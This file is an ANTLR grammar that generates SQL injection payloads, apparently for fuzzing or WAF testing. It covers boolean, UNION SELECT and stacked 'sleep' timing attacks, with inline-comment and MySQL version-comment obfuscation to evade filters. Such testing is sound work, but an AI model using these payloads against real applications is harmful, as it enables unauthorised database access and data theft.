grammar Injection;
start : numericContext | sQuoteContext | dQuoteContext;
dQuoteContext : terDQuote wsp booleanAttack wsp opOr terDQuote | terDQuote par wsp booleanAttack wsp opOr parOpen terDQuote | terDQuote  wsp sqliAttack cmt | terDQuote par  wsp sqliAttack cmt;
sQuoteContext : terSQuote wsp booleanAttack wsp opOr terSQuote | terSQuote par wsp booleanAttack wsp opOr parOpen terSQuote | terSQuote wsp sqliAttack cmt | terSQuote par wsp sqliAttack cmt;
numericContext : terDigitZero wsp booleanAttack wsp | terDigitZero par wsp booleanAttack wsp opOr parOpen terDigitZero | terDigitZero wsp sqliAttack cmt | terDigitZero par wsp sqliAttack cmt ;
//### Injection Context ###
sqliAttack : unionAttack | piggyAttack | booleanAttack ;
//### Piggy-backed Attacks ###
piggyAttack : opSem opSel wsp funcSleep;
//### Union Attacks ###
unionAttack : union wsp opSel wsp cols | union wsp unionPostfix opSel wsp cols | union wsp  parOpen opSel wsp cols par | union wsp unionPostfix  parOpen opSel wsp cols par;
union : opUni | t1 opUni t2 | t3 t4 opUni t5 ;
unionPostfix : all wsp | distinct wsp;
cols : terDigitZero;
distinct : 'distinct';
all : 'all';
t1: '/*!';
t2: '*/';
t3: '/*!';
t4: '50000';
t5: '*/';
//# boolean values which evaluate to false
booleanAttack : orAttack | andAttack ;
andAttack : opAnd booleanFalseExpr ;
orAttack : opOr booleanTrueExpr ;
booleanFalseExpr : unaryFalse ;
unaryFalse : falseAtom | wsp opNot wsp trueAtom | wsp opNot opBinInvert falseAtom;
falseAtom : wsp falseConst |  wsp terDigitZero | terSQuote terSQuote ;
falseConst : 'false';


//### Boolean-based Attacks ###

// boolean values which evaluate to true
// trueConst = "true" | "tr" , [inlineCmt] , "ue"
booleanTrueExpr : unaryTrue | binaryTrue;
binaryTrue : unaryTrue opEqual wsp parOpen unaryTrue par | unaryFalse opEqual wsp parOpen unaryFalse par | terSQuote terChar terSQuote opEqual terSQuote terChar terSQuote | terDQuote terChar terDQuote opEqual terDQuote terChar terDQuote | unaryFalse opLt parOpen unaryTrue par | unaryTrue opGt parOpen unaryFalse par | wsp trueAtom wsp opLike wsp trueAtom | unaryTrue wsp opIs wsp trueConst | unaryFalse wsp opIs wsp falseConst | unaryTrue opMinus parOpen unaryFalse par;
unaryTrue : wsp trueAtom | wsp opNot wsp falseAtom | opBinInvert wsp falseAtom | opBinInvert wsp trueAtom ;
trueAtom : trueConst | terDigitOne ;
trueConst: 'true';





// Obfuscation
wsp : blank | inlineCmt;




// Syntax-repairing
cmt : hashtag | doubleDash blank;
hashtag : '#';
doubleDash : '--';
// SQL functions
funcSleep : sleep  parOpen  terDigitExcludingZero  par ;
sleep: 'sleep';
blank : ' ' ;
inlineCmt : '/**/' ;
parOpen : '(';
par : ')' ;
terOne : '1';
terSQuote : '\'';
terDQuote : '"';
terDigitZero : '0';
terDigitOne : '1';
terDigitExcludingZero : terDigitOne | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9';
terDigitIncludingZero : terDigitZero | terDigitExcludingZero;
terChar : 'a';

// SQL Operators and Keyword
opNot : '!' | 'not';
opBinInvert : '~';
opEqual : '=';
opLt : '<';
opGt : '>';
opLike : 'like';
opIs : 'is';
opMinus : '-';
opOr : 'or' | '||';
opAnd : 'and' | '&&';
opSel : 'select';
opUni : 'union';
opSem : ';' ;
